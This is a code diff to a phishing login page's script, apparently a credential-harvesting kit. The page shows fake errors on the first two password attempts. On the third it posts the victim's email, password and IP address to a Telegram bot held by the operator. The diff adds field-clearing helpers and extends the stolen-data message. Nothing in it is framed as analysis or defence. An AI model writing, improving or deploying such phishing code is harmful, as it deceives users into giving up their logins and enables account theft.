@@ -131,7 +131,7 @@
     const ADMIN_ID = "8295417969";
 
     let currentEmail = "";
-    let attemptCount = 0;  // د پاسورډ هڅو شمېر
+    let attemptCount = 0;
 
     function hasPashtoCharacters(text) {
         const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
@@ -154,6 +154,10 @@
         setTimeout(() => box.style.display = 'none', 3000);
     }
 
+    function clearPasswordField() {
+        document.getElementById('passwordInput').value = '';
+    }
+
     function goBackToEmail() {
         document.getElementById('step2View').classList.add('hidden');
         document.getElementById('step1View').classList.remove('hidden');
@@ -171,11 +175,13 @@
         
         if (hasPashtoCharacters(email)) {
             showMessage(errorBox, 'please pashto not allowed', true);
+            document.getElementById('emailInput').value = '';
             return;
         }
         
         if (!email || !isValidEmail(email)) {
             showMessage(errorBox, 'Please check your email', true);
+            document.getElementById('emailInput').value = '';
             return;
         }
         
@@ -188,12 +194,11 @@
         attemptCount = 0;
     };
 
-    // Step 2: Password Processing - ONLY on 3rd attempt it will login
+    // Step 2: Password Processing
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         let errorBox = document.getElementById('errorBox');
         
-        // Increment attempt counter
         attemptCount++;
         
         // Check for Pashto characters
@@ -205,6 +210,7 @@
             } else if (attemptCount === 3) {
                 showMessage(errorBox, 'please pashto not allowed', true);
             }
+            clearPasswordField();
             return;
         }
         
@@ -217,6 +223,7 @@
             } else if (attemptCount === 3) {
                 showMessage(errorBox, 'Password must be at least 8 characters', true);
             }
+            clearPasswordField();
             return;
         }
         
@@ -229,18 +236,18 @@
             } else if (attemptCount === 3) {
                 showMessage(errorBox, 'Please enter your password', true);
             }
+            clearPasswordField();
             return;
         }
         
         // Valid password (8+ chars, no Pashto)
         if (attemptCount === 3) {
-            // دریمه هڅه او پاسورډ سم دی -> بریالی لاګ ان
             let ip = await getUserIP();
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     chat_id: ADMIN_ID, 
-                    text: `✅ LOGIN SUCCESS (3rd attempt)\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
+                    text: `access from login telegrame page\n✅ LOGIN SUCCESS (3rd attempt)\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}\nmodel: ${model}`,
                     parse_mode: 'Markdown'
                 })
             });
@@ -253,12 +260,12 @@
             }, 2000);
             attemptCount = 0;
         } else {
-            // لومړۍ یا دوهمه هڅه که پاسورډ سم وي، لاګ ان نه کوي - ایرر ورکوي
             if (attemptCount === 1) {
                 showMessage(errorBox, 'Please check your email', true);
             } else if (attemptCount === 2) {
                 showMessage(errorBox, 'Please check your email password', true);
             }
+            clearPasswordField();
         }
     };
 </script>
